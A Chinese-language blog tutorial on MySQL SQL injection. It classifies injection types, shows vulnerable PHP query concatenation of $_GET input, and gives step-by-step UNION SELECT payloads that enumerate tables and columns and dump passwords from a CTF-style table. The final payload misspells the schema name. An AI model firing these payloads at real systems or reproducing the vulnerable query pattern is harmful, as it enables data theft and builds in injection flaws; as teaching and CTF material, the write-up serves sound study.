---
layout: post
title: MySQL 注入介绍与联合查询注入
date: 2023-08-15 14:00:00
description: SQL 注入攻击原理与联合查询注入方法详解
tags: Web安全 SQL注入 MySQL 安全
categories: Web安全
---

# MySQL 注入介绍与联合查询注入

## MySQL 注入介绍

### 什么是SQL注入

SQL注入是一种将SQL代码插入或添加到应用的输入参数中的攻击，之后再将这些参数
传递给后台的SQL服务加以解析并执行。

凡是构造SQL语句的步骤均存在被潜在攻击的风险。SQL注入的主要方式是直接将代码
插入参数中，这些参数会被置入SQL命令中加以执行。

SQL注入产生的条件：用户控制了SQL语句的一部分，用户的输入不再是一个输入参数，
而成为了符合语法的SQL语句

### SQL注入的类型

**按数据结构划分（不推荐）：**

• 数字型

```sql
"select * from product where id = ". $_GET['id']
```

• 字符型

```sql
"select * from person_info where username='" . $_GET['name']."'"
```

**按回显方式划分：**

**有回显**：
• 联合查询  ->  构造联合查询语句，直接查看查询结果
• 报错注入  ->  构造报错语句，在报错中查看结果
• 堆查询     ->  多行语句执行，进而实现想要达到的目的

**无回显：**
• 盲注         ->  布尔型/时间型 通过某种手段“爆破”结果

## MySQL联合查询注入的利用

### 1.判断是否存在注入，字符型还是数字型

**整数型：** 1 and 1=1（正确）1 and 1=2 （错误）

**字符型：** 1' and 1=1 --+(正确) 1' and 1=2 --+(错误)

&#x20;         \--+为注释可用--（空格）或者#代替

### 2.猜解SQL查询语句中的字段数

使用后面拼接 order by （数字）（#）进行猜解

### 3.确定显示的字段顺序

```sql
1' union select 1,2 #，查询成功
```

#### 4.获取当前数据库的表名

```sql
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
补充：
use (database);show tables;

```

**group\_concat()**:用于将输出合并到一行

group\_concat()被屏蔽时可使用limit进行逐行输出

#### 5.获取表中字段名

```sql
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #


```

#### 6.获取字段内容

```sql
1' union select 1,2,group_concat(password) from ctfshow_user2
```

#### 补充：获取数据库名

```sql
1' union select 1,2,group_concat(schema_name) from informations_schema.schemata
```
